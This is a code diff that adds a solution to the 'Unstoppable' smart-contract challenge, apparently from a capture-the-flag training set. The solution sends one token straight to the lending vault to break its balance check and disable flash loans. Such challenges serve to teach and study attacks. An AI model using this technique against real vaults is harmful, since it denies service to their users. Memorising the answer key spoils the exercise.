@@ -43,8 +43,11 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    it("Exploit", async function () {
+        //If we send some DVT tokens to lender contract manually not using deposit()
+        //there will be an inbalance that breaks the condition enforced in the flashLoan() function.
+        //The vault won't be able to offer flash loans anymore.
+        await token.connect(player).transfer(vault.address, 1);
     });
 
     after(async function () {
